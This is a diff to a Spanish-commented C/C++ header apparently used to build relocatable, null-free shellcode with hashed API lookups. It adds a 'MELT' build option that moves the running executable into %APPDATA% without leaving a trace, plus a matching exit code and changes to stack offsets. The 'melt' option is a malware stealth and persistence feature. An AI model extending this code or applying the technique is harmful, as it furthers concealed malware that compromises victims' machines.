@@ -10,11 +10,23 @@
 **            +Una shellcode libre de bytes nulos
 **            +Direcciones relativas que permitan la reubicación del código
 **            +Un gestor de errores
+**            +Posibilidad de hacer melt con el ejecutable a %APPDATA%
 *###############################################################################*/
 
 #include "preprocessor/for_each_i.hpp"
 #include "preprocessor/fold_left.hpp"
 #include "preprocessor/cat.hpp"
+
+/*###############################################################################
+** MELT:
+**    Si se define la compilación MELT el código generado tendrá
+**    la capacidad de ejecutar la ejecución en %APPDATA% sin dejar rastro.
+**    NOTA:{
+**        Se añade código, como consecuencia aumenta el tamaño
+**    }
+*###############################################################################*/
+#define MELT
+#undef MELT
 
 /*###############################################################################
 ** Error_Check:
@@ -25,7 +37,7 @@
 **    }
 *###############################################################################*/
 #define ERR_CHECK
-#undef ERR_CHECK
+//#undef ERR_CHECK
 
 /*###############################################################################
 ** Control de errores:
@@ -40,6 +52,7 @@
 #define ERR_MEM 0x3     //Ha habido un error al reservar memoria.
 #define ERR_SUM 0x4     //Ha habido un error en la suma de comprobación.
 #define ERR_MTX 0x5     //El server ya está en ejecución.
+#define MELT_DONE 0x6   //Cerrado por MELT
 
 /*###############################################################################
 ** Shellcode:
@@ -101,21 +114,21 @@
 **    hash.
 *###############################################################################*/
 #define API_DEFINE(name, SEQ)\
-    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)};\
+    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)-0x40};\
     HASH_AND_EMIT(SEQ)
 /*###############################################################################
 ** VAR_DEFINE:
 **    Macro que genera el offset de una variable en el stack de APIs.
 *###############################################################################*/
 #define VAR_DEFINE(name)\
-    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)};
+    enum {BOOST_PP_CAT(_, name) = (__COUNTER__*4)-0x40};
 
 /*###############################################################################
 ** CALC_STACKSIZE:
 **    Macro que calcula el tamaño del stack de APIs
 *###############################################################################*/
 #define CALC_STACKSIZE()\
-    enum {STACKSIZE = (__COUNTER__*4)};
+    enum {STACKSIZE = (__COUNTER__*4)+0x40};
 
 /*###############################################################################
 ** Macros de shellcode:
